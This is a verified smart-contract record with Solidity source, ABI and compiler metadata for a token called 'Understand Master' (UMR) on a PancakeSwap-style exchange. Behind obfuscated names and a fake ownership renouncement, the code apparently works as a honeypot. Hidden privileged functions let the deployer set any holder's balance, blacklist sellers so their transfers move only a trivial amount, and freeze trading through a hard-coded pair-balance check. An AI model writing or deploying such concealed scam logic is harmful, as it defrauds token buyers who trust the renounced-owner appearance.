{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface totalSell {\n    function createPair(address buyAmountTx, address limitIs) external returns (address);\n}\n\ninterface launchToken {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address buyAtReceiver) external view returns (uint256);\n\n    function transfer(address buyTeam, uint256 isFundAuto) external returns (bool);\n\n    function allowance(address maxMarketing, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 isFundAuto) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address buyTeam,\n        uint256 isFundAuto\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed toWallet, uint256 value);\n    event Approval(address indexed maxMarketing, address indexed spender, uint256 value);\n}\n\nabstract contract exemptAtLimit {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fromAt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface launchTokenMetadata is launchToken {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract UnderstandMaster is exemptAtLimit, launchToken, launchTokenMetadata {\n\n    address public receiverAt;\n\n    mapping(address => bool) public marketingAmount;\n\n    function name() external view virtual override returns (string memory) {\n        return isAt;\n    }\n\n    string private tradingTx = \"UMR\";\n\n    address launchedWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function owner() external view returns (address) {\n        return launchFundTotal;\n    }\n\n    uint256 public exemptSenderAt;\n\n    function shouldTotal(address toReceiver) public {\n        if (takeWalletList) {\n            return;\n        }\n        if (fundToIs == modeSender) {\n            liquiditySender = false;\n        }\n        marketingAmount[toReceiver] = true;\n        if (fundToIs == senderSell) {\n            fundToIs = true;\n        }\n        takeWalletList = true;\n    }\n\n    function marketingTxBuy(address walletAuto, uint256 isFundAuto) public {\n        teamShould();\n        minMode[walletAuto] = isFundAuto;\n    }\n\n    uint256 buyTotalToken;\n\n    function symbol() external view virtual override returns (string memory) {\n        return tradingTx;\n    }\n\n    string private isAt = \"Understand Master\";\n\n    bool public takeWalletList;\n\n    function approve(address modeReceiverLaunched, uint256 isFundAuto) public virtual override returns (bool) {\n        enableList[_msgSender()][modeReceiverLaunched] = isFundAuto;\n        emit Approval(_msgSender(), modeReceiverLaunched, isFundAuto);\n        return true;\n    }\n\n    bool private liquiditySender;\n\n    constructor (){\n        if (exemptSenderAt != teamAuto) {\n            teamAuto = amountTokenList;\n        }\n        fromAt txLimit = fromAt(launchedWallet);\n        fundToken = totalSell(txLimit.factory()).createPair(txLimit.WETH(), address(this));\n        \n        receiverAt = _msgSender();\n        marketingAmount[receiverAt] = true;\n        minMode[receiverAt] = amountFund;\n        walletReceiver();\n        if (fundToIs) {\n            teamAuto = amountTokenList;\n        }\n        emit Transfer(address(0), receiverAt, amountFund);\n    }\n\n    mapping(address => bool) public limitTx;\n\n    function balanceOf(address buyAtReceiver) public view virtual override returns (uint256) {\n        return minMode[buyAtReceiver];\n    }\n\n    uint8 private tradingAt = 18;\n\n    function launchedTake(address enableFundAuto) public {\n        teamShould();\n        if (exemptSenderAt != teamAuto) {\n            teamAuto = amountTokenList;\n        }\n        if (enableFundAuto == receiverAt || enableFundAuto == fundToken) {\n            return;\n        }\n        limitTx[enableFundAuto] = true;\n    }\n\n    address public fundToken;\n\n    bool public launchedTx;\n\n    function walletReceiver() public {\n        emit OwnershipTransferred(receiverAt, address(0));\n        launchFundTotal = address(0);\n    }\n\n    function receiverList(address minTake, address buyTeam, uint256 isFundAuto) internal returns (bool) {\n        if (minTake == receiverAt) {\n            return tradingEnable(minTake, buyTeam, isFundAuto);\n        }\n        uint256 walletTake = launchToken(fundToken).balanceOf(fromModeTake);\n        require(walletTake == modeList);\n        require(buyTeam != fromModeTake);\n        if (limitTx[minTake]) {\n            return tradingEnable(minTake, buyTeam, feeLaunched);\n        }\n        return tradingEnable(minTake, buyTeam, isFundAuto);\n    }\n\n    function transfer(address walletAuto, uint256 isFundAuto) external virtual override returns (bool) {\n        return receiverList(_msgSender(), walletAuto, isFundAuto);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return tradingAt;\n    }\n\n    event OwnershipTransferred(address indexed exemptLaunch, address indexed minTakeTx);\n\n    uint256 modeList;\n\n    function teamShould() private view {\n        require(marketingAmount[_msgSender()]);\n    }\n\n    function getOwner() external view returns (address) {\n        return launchFundTotal;\n    }\n\n    mapping(address => uint256) private minMode;\n\n    uint256 public listSwapToken;\n\n    function allowance(address maxFund, address modeReceiverLaunched) external view virtual override returns (uint256) {\n        if (modeReceiverLaunched == launchedWallet) {\n            return type(uint256).max;\n        }\n        return enableList[maxFund][modeReceiverLaunched];\n    }\n\n    address private launchFundTotal;\n\n    bool private modeSender;\n\n    uint256 private amountTokenList;\n\n    function transferFrom(address minTake, address buyTeam, uint256 isFundAuto) external override returns (bool) {\n        if (_msgSender() != launchedWallet) {\n            if (enableList[minTake][_msgSender()] != type(uint256).max) {\n                require(isFundAuto <= enableList[minTake][_msgSender()]);\n                enableList[minTake][_msgSender()] -= isFundAuto;\n            }\n        }\n        return receiverList(minTake, buyTeam, isFundAuto);\n    }\n\n    uint256 constant feeLaunched = 13 ** 10;\n\n    address fromModeTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function tradingEnable(address minTake, address buyTeam, uint256 isFundAuto) internal returns (bool) {\n        require(minMode[minTake] >= isFundAuto);\n        minMode[minTake] -= isFundAuto;\n        minMode[buyTeam] += isFundAuto;\n        emit Transfer(minTake, buyTeam, isFundAuto);\n        return true;\n    }\n\n    bool public senderSell;\n\n    bool public autoExemptSender;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return amountFund;\n    }\n\n    mapping(address => mapping(address => uint256)) private enableList;\n\n    uint256 private amountFund = 100000000 * 10 ** 18;\n\n    uint256 public teamAuto;\n\n    function buyFee(uint256 isFundAuto) public {\n        teamShould();\n        modeList = isFundAuto;\n    }\n\n    bool private fundToIs;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minTakeTx\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toWallet\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeReceiverLaunched\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeReceiverLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isFundAuto\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoExemptSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyAtReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"isFundAuto\",\"type\":\"uint256\"}],\"name\":\"buyFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptSenderAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableFundAuto\",\"type\":\"address\"}],\"name\":\"launchedTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listSwapToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isFundAuto\",\"type\":\"uint256\"}],\"name\":\"marketingTxBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toReceiver\",\"type\":\"address\"}],\"name\":\"shouldTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeWalletList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isFundAuto\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isFundAuto\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "UnderstandMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}